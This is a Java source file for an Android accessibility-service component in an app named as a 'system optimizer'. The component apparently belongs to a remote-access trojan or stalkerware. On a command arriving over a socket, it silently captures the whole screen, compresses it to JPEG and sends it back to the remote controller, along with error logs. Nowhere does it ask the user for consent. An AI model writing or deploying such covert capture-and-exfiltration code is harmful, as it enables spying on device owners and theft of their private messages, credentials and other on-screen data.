package com.system.optimizer.event_handler;

import java.io.ByteArrayOutputStream;

import com.system.optimizer.network.SocketManager;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import androidx.annotation.RequiresApi;

public class ScreenshotEventHandler {
    private static final String TAG = "ScreenshotEventHandler";

    private final AccessibilityService service;

    private final SocketManager socketManager;

    public ScreenshotEventHandler(AccessibilityService delegate, SocketManager socketManager) {
        if (delegate == null) {
            throw new IllegalArgumentException("AccessibilityService cannot be null");
        }
        if (socketManager == null) {
            throw new IllegalArgumentException("SocketManager cannot be null");
        }
        this.service = delegate;
        this.socketManager = socketManager;
        this.socketManager.addListener("screenshot", args -> onScreenshotRequestEvent());
    }

    public void onScreenshotRequestEvent() {
        // Check if device supports screenshot functionality
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            socketManager.sendEvent("logger", "Screenshot not supported on this Android version");
            return;
        }

        try {
            service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.getMainExecutor(),
                    new AccessibilityService.TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
                            try {
                                if (result == null) {
                                    socketManager.sendEvent("logger", "Screenshot result is null");
                                    return;
                                }

                                HardwareBuffer buffer = result.getHardwareBuffer();
                                if (buffer == null) {
                                    socketManager.sendEvent("logger", "HardwareBuffer is null");
                                    return;
                                }

                                ColorSpace colorSpace = result.getColorSpace();
                                if (colorSpace == null) {
                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                                }

                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                if (bitmap == null) {
                                    buffer.close();
                                    socketManager.sendEvent("logger", "Failed to create bitmap from HardwareBuffer");
                                    return;
                                }

                                buffer.close();
                                byte[] imageData = bitmapToJpegBytes(bitmap);
                                bitmap.recycle();
                                socketManager.sendEvent("screenshot_response", imageData);
                            } catch (Exception e) {
                                socketManager.sendEvent("logger", "Error processing screenshot: " + e.getMessage());
                            }
                        }

                        @Override
                        public void onFailure(int error) {
                            socketManager.sendEvent("logger", "Screenshot failed with error code: " + error);
                        }
                    });
        } catch (Exception e) {
            socketManager.sendEvent("logger", "Error taking screenshot: " + e.getMessage());
        }
    }

    /**
     * Convert Bitmap to JPEG byte array
     */
    private static byte[] bitmapToJpegBytes(Bitmap bitmap) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos); // 70% quality = good compression
        return baos.toByteArray();
    }
}